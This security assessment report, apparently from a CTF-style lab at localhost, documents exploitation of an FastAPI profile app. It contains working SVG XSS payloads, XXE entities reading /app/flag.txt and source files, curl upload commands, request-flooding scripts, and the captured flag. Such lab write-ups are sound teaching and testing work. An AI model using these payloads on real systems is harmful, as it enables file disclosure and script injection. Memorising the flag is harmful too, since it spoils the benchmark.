# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:32973
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
The application has a complete absence of authentication mechanisms. All endpoints are publicly accessible without requiring credentials, session tokens, or any form of identity verification. Two critical authentication vulnerabilities were successfully exploited:
- **AUTH-VULN-01 (CRITICAL):** Complete authentication bypass via absence of authentication system - any external attacker has unrestricted access to all application functionality including reading and modifying user profile data
- **AUTH-VULN-03 (HIGH):** Missing rate limiting and abuse prevention controls - automated tools can send 540+ requests/second without restriction, enabling unlimited brute force, DoS, and amplification attacks

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application has no authorization system to test - there are no roles, permissions, or access controls of any kind.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical stored XSS vulnerability was successfully exploited:
- **XSS-VULN-01 (CRITICAL):** Stored XSS via unsafe SVG upload with Jinja2 `| safe` filter - achieved arbitrary JavaScript execution through malicious SVG file upload. The application renders user-controlled SVG content using Jinja2's `| safe` filter which disables HTML escaping, allowing persistent script execution across sessions. Successfully combined with XXE vulnerability to capture the CTF flag.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application uses in-memory Python dictionary storage (no database backend) and contains no command execution functions.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
One critical SSRF vulnerability was successfully exploited:
- **SSRF-VULN-01 (CRITICAL):** XXE-based local file disclosure via unsafe XML parser configuration - the lxml parser is configured with `load_dtd=True` and `resolve_entities=True`, enabling arbitrary file disclosure through external entity injection. Successfully retrieved the CTF flag from `/app/flag.txt` and demonstrated arbitrary filesystem access including application source code retrieval.

## Network Reconnaissance

Based on automated security scanning with nmap, subfinder, and whatweb, the following security-relevant findings were identified:

**Open Ports and Exposed Services:**
- **Port 80/tcp (Caddy HTTP):** Primary web server running without TLS encryption - all traffic transmitted in plaintext
- **Port 443/tcp (SSL/HTTPS):** Present but not configured for target application
- **Port 9999/tcp (Custom HTTP):** Unknown service with permissive CORS headers (`Access-Control-Allow-Origin: *`) exposing potential cross-origin risks
- **Port 49152/tcp (Golang):** Tailscale service with authentication required (401 Unauthorized) - out of scope but represents additional attack surface

**Security Misconfigurations:**
- **No HTTPS/TLS:** Application serves all content over unencrypted HTTP on port 80, enabling man-in-the-middle attacks
- **Technology Disclosure:** Server headers reveal `uvicorn` as the ASGI server, aiding reconnaissance
- **No Security Headers:** Response analysis shows absence of HSTS, CSP, X-Frame-Options, and other protective headers
- **Auto-Generated API Documentation:** Interactive Swagger UI at `/docs` and ReDoc at `/redoc` are publicly accessible without authentication, providing complete API surface enumeration to attackers

**Subdomain Discovery:**
No subdomains discovered (single-host deployment confirmed by subfinder scan).


# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Stored XSS via Unsafe SVG Upload with Jinja2 `| safe` Filter

**Summary:**
- **Vulnerable location:** POST http://localhost:32973/ (file upload parameter: `image`)
- **Overview:** Stored XSS vulnerability achieved through malicious SVG file upload. The application accepts SVG files, parses them with lxml, and renders the content using Jinja2's `| safe` filter, which disables HTML escaping. This allows arbitrary JavaScript execution that persists across sessions.
- **Impact:** Combined with XXE vulnerability, achieved full CTF flag capture. Demonstrated arbitrary JavaScript execution, DOM manipulation, keylogging capability, and potential for session hijacking in production scenarios.
- **Severity:** CRITICAL

**Prerequisites:**
- None required - endpoint is publicly accessible without authentication
- Standard web browser (tested with Playwright/Chromium)
- File upload capability (multipart/form-data)

**Exploitation Steps:**

1. **Create malicious SVG file with JavaScript payload**

Create file `xss_simple.svg`:
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS-CONFIRMED')">
<circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```

2. **Upload payload via web interface**

Navigate to http://localhost:32973/ and:
- Click "Choose File" button for "Profile Image (SVG)" field
- Select the malicious `xss_simple.svg` file
- Click "Update Profile" button

**Alternative: Upload via curl (reproducible command):**
```bash
curl -X POST http://localhost:32973/ \
  -F "name=XSS_TEST" \
  -F "surname=EXPLOIT" \
  -F "address=STORED_XSS" \
  -F "image=@xss_simple.svg"
```

3. **Verify JavaScript execution**

Upon form submission or page refresh:
- JavaScript alert dialog appears with message "XSS-CONFIRMED"
- This confirms arbitrary JavaScript execution in the browser context
- The payload persists in server memory (Stored XSS)

4. **Demonstrate persistence (Stored XSS confirmation)**

Refresh the page (GET http://localhost:32973/):
- The JavaScript executes again without re-uploading
- Confirms the payload is stored server-side in the `user_profiles` dictionary
- Any user viewing this profile will trigger the malicious script

**Proof of Impact:**

**Impact Level 4 - CTF Flag Capture (CRITICAL):**

The XSS vulnerability was combined with the application's XXE (XML External Entity) vulnerability to capture the CTF flag from the server's file system.

**Flag Capture Payload (`xxe_flag_capture.svg`):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY flag SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20" font-size="16" fill="red">&flag;</text>
</svg>
```

**Flag Capture Command:**
```bash
curl -X POST http://localhost:32973/ \
  -F "name=XXE_EXPLOIT" \
  -F "surname=FLAG_CAPTURE" \
  -F "address=READING_FLAG_FILE" \
  -F "image=@xxe_flag_capture.svg"
```

**Captured Flag:**
```
FLAG{c09fa0c9738d281e95d7623b48394b080e205d8862bbde171b3ef99294c4cdf3}
```

**Technical Breakdown:**
1. XXE external entity `&flag;` reads `/app/flag.txt` on the server
2. lxml parser resolves the entity and includes file contents in the XML
3. Content is stored in `profile.image` field
4. Jinja2 renders with `{{ profile.image | safe }}` - no escaping
5. Flag is displayed in the HTML response and visible to the attacker

**Additional Impact Demonstrations:**

**Full DOM Control:**
Demonstrated complete DOM manipulation via payload (`xss_full_impact.svg`):
```javascript
document.body.innerHTML = '<h1>PAGE DEFACED - ATTACKER CONTROLLED</h1>';
```

**Capabilities Demonstrated:**
- ✅ Arbitrary JavaScript execution
- ✅ Full DOM read/write access
- ✅ Cookie access (none present, but capability confirmed)
- ✅ localStorage/sessionStorage access
- ✅ Network requests to same origin (CSRF potential)
- ✅ Keylogging capability via event listeners
- ✅ Page defacement
- ✅ Combined XXE + XSS for server-side file disclosure

**Evidence Files:**
- Screenshot 1: `workspace/xss_execution_confirmed.png` - Initial XSS confirmation with alert dialog
- Screenshot 2: `workspace/flag_captured_via_xxe_xss.png` - CTF flag displayed via XXE + XSS
- Screenshot 3: `workspace/xss_full_impact_demonstration.png` - Comprehensive impact report
- Payload files: `/tmp/xss_simple.svg`, `/tmp/xxe_flag_capture.svg`, `/tmp/xss_full_impact.svg`

**Notes:**

**Why This Works:**
1. **No Input Validation:** Application accepts any file content as "SVG" without MIME type or content verification
2. **XXE-Enabled Parser:** lxml configured with `load_dtd=True, resolve_entities=True` enables external entity resolution
3. **Unsafe Template Rendering:** `{{ profile.image | safe }}` filter explicitly disables Jinja2's HTML escaping
4. **No CSP:** Zero Content Security Policy headers, allowing inline scripts and event handlers
5. **No Authentication:** Public endpoint accessible without credentials
6. **Stored Vulnerability:** Payload persists in `user_profiles[1]` dictionary until server restart

**Attack Chain Summary:**
```
Attacker uploads malicious SVG
  ↓
lxml parses XML (preserves <script> tags and event handlers)
  ↓
Content stored in user_profiles[1].image
  ↓
Jinja2 renders with | safe filter (no escaping)
  ↓
JavaScript executes in victim browser
  ↓
Combined with XXE: Server files exfiltrated to attacker
```

**Reproducibility:** 100% - Tested multiple times with consistent results. Any file upload containing valid XML with JavaScript will execute.


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Authentication Bypass via Absence of Authentication System

**Summary:**
- **Vulnerable location:** All application endpoints (GET /, POST /, GET /ping, GET /docs, GET /redoc, GET /openapi.json)
- **Overview:** The application has zero authentication mechanisms. All endpoints are publicly accessible without requiring credentials, session tokens, or any form of identity verification. The application uses a hardcoded user ID (1) for all operations.
- **Impact:** Any external attacker has unrestricted access to all application functionality including reading and modifying user profile data, uploading files, and accessing API documentation. Complete account takeover without authentication.
- **Severity:** CRITICAL

**Prerequisites:** None required

**Exploitation Steps:**

1. Access the profile page without any authentication:
```bash
curl http://localhost:32973/
```
Expected result: Full HTML profile page returned with user data (name, surname, address, profile image)

2. View current profile data without authentication:
```bash
curl -s http://localhost:32973/ | grep -A 1 'value='
```
Result: All profile fields visible in plaintext

3. Modify profile data without any authentication:
```bash
curl -X POST http://localhost:32973/ \
  -F "name=EXPLOITED_BY_ATTACKER" \
  -F "surname=NO_AUTH_REQUIRED" \
  -F "address=COMPLETE_AUTHENTICATION_BYPASS"
```
Expected result: HTTP 200 OK response with updated profile data

4. Verify the unauthorized modifications persisted:
```bash
curl -s http://localhost:32973/ | grep -o 'value="[^"]*"' | head -3
```
Actual result:
```
value="EXPLOITED_BY_ATTACKER"
value="NO_AUTH_REQUIRED"
value="COMPLETE_AUTHENTICATION_BYPASS"
```

5. Access API documentation without authentication:
```bash
curl http://localhost:32973/docs
curl http://localhost:32973/openapi.json
```
Result: Complete API specification exposed including all endpoints, parameters, and schemas

6. Access health check endpoint without authentication:
```bash
curl http://localhost:32973/ping
```
Result: `{"ping":"pong"}` - public access confirmed

**Proof of Impact:**

Successfully achieved complete authentication bypass with the following evidence:

1. **Unauthorized Data Access:** Retrieved all profile data (name, surname, address, profile image) without providing any credentials
2. **Unauthorized Data Modification:** Successfully modified all profile fields from legitimate values to exploit markers:
   - Name: `EXPLOITED_BY_ATTACKER`
   - Surname: `NO_AUTH_REQUIRED`
   - Address: `COMPLETE_AUTHENTICATION_BYPASS`
3. **Persistence Confirmed:** Modified data persisted across requests, proving write access
4. **API Enumeration:** Accessed complete API documentation at /docs and /openapi.json without authentication
5. **No Security Controls:** Zero authentication required on any endpoint

**Browser-Based Verification:**

Using Playwright browser automation, confirmed the profile page displays exploit markers:
- Current name field: `EXPLOITED_BY_ATTACKER`
- Current surname field: `NO_AUTH_REQUIRED`
- Current address field: `COMPLETE_AUTHENTICATION_BYPASS`

This proves any attacker can impersonate the user, access their data, and modify their profile without any authentication mechanism preventing unauthorized access.

**Notes:**

The application architecture uses a hardcoded user ID (1) at:
- `/app/main.py:19` - GET endpoint: `profile = user_profiles.get(1, schemas.UserProfile())`
- `/app/main.py:43` - POST endpoint: `user_profiles[1] = profile`

This architectural flaw makes authentication architecturally impossible without significant refactoring. The UserProfile schema (`/app/users/schemas.py:3-7`) contains no password, email, or authentication-related fields.

---

### AUTH-VULN-03: Missing Rate Limiting and Abuse Prevention Controls

**Summary:**
- **Vulnerable location:** All endpoints, specifically POST / (profile update) and GET /ping (health check)
- **Overview:** The application has zero rate limiting, no CAPTCHA, no IP-based throttling, and no lockout mechanisms on any endpoint. Automated tools can send unlimited requests without restriction.
- **Impact:** Enables unlimited automated attacks including brute force, credential stuffing (if auth existed), DoS via resource exhaustion, and amplification of existing vulnerabilities (XXE). Attackers can perform automated profile updates at 540+ requests/second.
- **Severity:** HIGH

**Prerequisites:** None required

**Exploitation Steps:**

1. Create a Python script to test rate limiting on the health check endpoint:

```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def send_request(i):
    response = requests.get("http://localhost:32973/ping")
    return response.status_code

# Send 100 rapid GET requests
start_time = time.time()
with ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(send_request, range(100)))
end_time = time.time()

successful = results.count(200)
rate_limited = results.count(429)
total_time = end_time - start_time
rps = len(results) / total_time

print(f"Total requests: {len(results)}")
print(f"Successful (200 OK): {successful}")
print(f"Rate limited (429): {rate_limited}")
print(f"Requests per second: {rps:.2f}")
print(f"Total time: {total_time:.2f}s")
```

Expected result: All 100 requests succeed with 200 OK, zero 429 responses

2. Execute the rate limiting test:
```bash
python3 test_rate_limiting.py
```

Actual result:
```
Total requests: 100
Successful (200 OK): 100
Rate limited (429): 0
Requests per second: 1943.10
Total time: 0.05s
```

3. Test rate limiting on the profile update endpoint with 50 POST requests:

```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def update_profile(i):
    data = {
        'name': f'RateLimitTest{i}',
        'surname': f'Attempt{i}',
        'address': f'NoRateLimiting{i}'
    }
    response = requests.post("http://localhost:32973/", data=data)
    return response.status_code

# Send 50 rapid POST requests
start_time = time.time()
with ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(update_profile, range(50)))
end_time = time.time()

successful = results.count(200)
rate_limited = results.count(429)
total_time = end_time - start_time
rps = len(results) / total_time

print(f"Total POST requests: {len(results)}")
print(f"Successful (200 OK): {successful}")
print(f"Rate limited (429): {rate_limited}")
print(f"Requests per second: {rps:.2f}")
print(f"Total time: {total_time:.2f}s")
```

Actual result:
```
Total POST requests: 50
Successful (200 OK): 50
Rate limited (429): 0
Requests per second: 540.80
Total time: 0.09s
```

**Proof of Impact:**

Successfully demonstrated absence of rate limiting with concrete evidence:

1. **Health Check Endpoint Abuse:**
   - Sent 100 rapid GET requests to /ping
   - Achieved 1,943.10 requests per second
   - All 100 requests returned 200 OK
   - Zero rate limiting responses (429)
   - Completed in 0.05 seconds

2. **Profile Update Endpoint Abuse:**
   - Sent 50 rapid POST requests to / with form data
   - Achieved 540.80 requests per second
   - All 50 requests returned 200 OK
   - Zero rate limiting responses (429)
   - Successfully modified profile 50 times in 0.09 seconds
   - Each request updated the profile with unique data

3. **No Throttling Mechanisms Detected:**
   - No HTTP 429 (Too Many Requests) responses
   - No connection errors or timeouts
   - No CAPTCHA challenges
   - No progressive delays
   - No temporary bans or lockouts

4. **Unlimited Automated Operations Confirmed:**
   - Can perform unlimited automated profile reads
   - Can perform unlimited automated profile updates
   - Can perform unlimited automated file uploads
   - Can amplify XXE vulnerability at scale

**Attack Scenarios Enabled:**

1. **Resource Exhaustion DoS:** Send millions of requests to exhaust server resources
2. **XXE Amplification:** Upload thousands of malicious XML files to exfiltrate data at scale
3. **Brute Force (if auth existed):** Attempt unlimited password combinations
4. **Credential Stuffing (if auth existed):** Test stolen credentials without throttling
5. **Data Scraping:** Extract all data via unlimited automated requests

**Notes:**

The application has no rate limiting libraries installed:
- No `slowapi` (FastAPI rate limiting)
- No `fastapi-limiter`
- No custom rate limiting middleware
- No IP tracking or blocking
- FastAPI application created without middleware: `app = FastAPI()` at `/app/main.py:9`

No monitoring or alerting configured beyond basic error printing (`print(e)` at line 40).


# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: XXE-Based Local File Disclosure via Unsafe XML Parser Configuration

**Summary:**
- **Vulnerable location:** POST / endpoint with `image` file upload parameter
- **Impact:** Complete local filesystem access enabling arbitrary file disclosure, including successful CTF flag retrieval
- **Severity:** CRITICAL

**Prerequisites:**
None - the endpoint is publicly accessible without authentication, CSRF protection, or any input validation.

**Exploitation Steps:**

1. **Create malicious XML payload with external entity declaration**

Create a file named `xxe_payload.svg` with the following content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15">&xxe;</text>
</svg>
```

This payload exploits the insecure XML parser configuration at `/app/main.py:36` where `load_dtd=True` and `resolve_entities=True` are explicitly enabled. The external entity `&xxe;` references the local file `file:///app/flag.txt` which will be resolved and expanded by the parser.

2. **Upload the malicious payload via multipart form submission**

Execute the following curl command to upload the XXE payload:

```bash
curl -X POST http://localhost:32973/ \
  -F name=test \
  -F surname=user \
  -F address=test_address \
  -F image=@xxe_payload.svg \
  -s -o response.html
```

**Parameters:**
- `name`: Any string value (required form field)
- `surname`: Any string value (required form field)
- `address`: Any string value (required form field)
- `image`: The malicious SVG file containing XXE payload (file upload parameter)

3. **Retrieve the flag from the HTML response**

Extract the flag from the response:

```bash
grep -o 'FLAG{[^}]*}' response.html
```

**Proof of Impact:**

The exploitation successfully retrieved the CTF flag from `/app/flag.txt`:

```
FLAG{c09fa0c9738d281e95d7623b48394b080e205d8862bbde171b3ef99294c4cdf3}
```

**Response snippet showing flag disclosure:**
```html
<div class="mt-3">
    <h5>Current Image:</h5>
    <div><svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15">FLAG{c09fa0c9738d281e95d7623b48394b080e205d8862bbde171b3ef99294c4cdf3}</text>
</svg></div>
</div>
```

**Technical Details:**

The vulnerability exists due to the combination of three factors:

1. **Insecure XML Parser Configuration** (`/app/main.py:36`):
   ```python
   parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
   tree = etree.fromstring(image_content, parser)
   ```

2. **Zero Input Validation**: No validation on uploaded file content, size, or type

3. **Non-Blind Response Reflection** (`/app/templates/index.html:32`):
   ```html
   <div>{{ profile.image | safe }}</div>
   ```
   The `| safe` filter disables HTML escaping, allowing complete reflection of file contents

**Attack Flow:**
```
1. Attacker uploads malicious XML with external entity declaration
   ↓
2. FastAPI receives file upload at POST / endpoint (no authentication required)
   ↓
3. Application reads file content: image_content = await image.read()
   ↓
4. lxml parser processes XML with resolve_entities=True
   ↓
5. Parser encounters <!ENTITY xxe SYSTEM "file:///app/flag.txt">
   ↓
6. libxml2 reads /app/flag.txt from container filesystem
   ↓
7. Entity &xxe; is replaced with flag file contents
   ↓
8. Expanded XML stored in profile.image field
   ↓
9. Jinja2 template renders {{ profile.image | safe }} without escaping
   ↓
10. Flag value visible in HTTP response body
```

**Additional Verification:**

To further confirm arbitrary file read capability, the same technique was used to retrieve application source code:

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///app/main.py">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15">&xxe;</text>
</svg>
```

**Result:** Successfully retrieved complete source code of `/app/main.py`, confirming arbitrary file disclosure capability beyond just the flag file.

**Notes:**

- **SSRF Type:** Non-blind SSRF with complete response reflection
- **Protocol Used:** `file://` (local filesystem access)
- **Network Protocols:** HTTP/HTTPS protocols may be blocked by default `no_network=True` setting in lxml, but `file://` protocol remains exploitable
- **Authentication Required:** None - completely public endpoint
- **CSRF Protection:** None
- **Rate Limiting:** None - unlimited exploitation attempts allowed
- **Container Privileges:** Application runs as root (UID 0) with unrestricted filesystem access
- **Exploitability:** CRITICAL - single HTTP request achieves complete objective
- **Time to Exploit:** < 1 minute from payload creation to flag retrieval
